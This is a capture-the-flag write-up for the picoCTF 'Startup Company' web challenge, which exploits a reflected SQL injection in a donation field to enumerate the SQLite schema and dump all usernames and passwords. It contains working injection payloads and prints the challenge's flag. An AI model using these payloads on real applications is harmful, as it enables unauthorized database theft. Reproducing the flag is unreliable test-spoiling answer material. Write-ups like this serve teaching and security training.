# Startup Company

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{1_c4nn0t_s33_y0u_58183fce}`

## Summary

A "donate to my startup" app lets any registered user submit a `moneys` amount, which gets
written into the database and immediately read back and displayed. The amount is concatenated
directly into a raw SQL string with no sanitization, and — since the app re-reads and echoes the
stored value in the same response — the injection point doubles as a data-exfiltration channel:
any SQL expression placed in `moneys` gets evaluated and reflected straight back on the page.

## Discovery

Registering (`/register.php`) auto-creates an account and logs in, landing on `/contribute.php`,
which accepts a numeric `moneys` field (plus a throwaway per-request `captcha` hidden field) and
echoes back "You're latest contribution: $X". The field isn't actually validated as numeric
server-side — submitting `moneys=0x1A` or `moneys=Infinity` gets stored and echoed verbatim.

Submitting a single quote broke the query outright:

```
moneys=100'
```

```
Warning: SQLite3::query(): Unable to prepare statement: 1, near "testuser77889": syntax error
  in /var/www/html/contribute.php on line 11
Database error.
```

The error naming the *username* (not the money value) confirmed the raw quote closed the
`moneys` string literal early and spilled into the rest of the query. Testing SQLite string
concatenation confirmed the injection lands in an evaluated SQL expression, not just a stored
string:

```
moneys=100'||'1
```

```
You're latest contribution: $1001
```

`'100'||'1'` was evaluated by SQLite as string concatenation (`"100" + "1" = "1001"`) rather than
stored as the literal text `100'||'1`, proving the value is both injectable *and* immediately
reflected back after being evaluated — a self-contained read oracle with no need for blind/boolean
techniques.

## Proof of Concept

Enumerate the schema through the same channel, closing the string with `'||(...)||'` so the
subquery result becomes the entire displayed value:

```
moneys='||(SELECT group_concat(name) FROM sqlite_master)||'
→ $startup_users

moneys='||(SELECT sql FROM sqlite_master WHERE name='startup_users')||'
→ $CREATE TABLE startup_users (nameuser text, wordpass text, money int)
```

Dump every row directly:

```
moneys='||(SELECT group_concat(nameuser || ':' || wordpass || ':' || money, '|') FROM startup_users)||'
```

```
admin:password:100|ron:not_the_flag_db1d1c41:100|veronica:not_the_flag_de19f38f:100|
brick:not_the_flag_6d8cfc3e:100|brian:not_the_flag_f96b8d32:100|champ:not_the_flag_3e25274b:100|
the_real_flag:picoCTF{1_c4nn0t_s33_y0u_58183fce}:100|...
```

The table is seeded with several decoy rows (an `admin:password` account and multiple
`not_the_flag_*` passwords) to punish blind guessing; the real flag sits in the
`wordpass` column of a row literally named `the_real_flag`.

## Root Cause

User-controlled input is concatenated directly into a SQL statement with no parameterization,
and — unlike a typical blind SQLi — the application conveniently re-displays exactly what the
query evaluates to, turning every injection into an instant, unauthenticated full read of the
database.

## CWE / OWASP

- **CWE-89**: SQL Injection
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor
- **OWASP A03:2021**: Injection
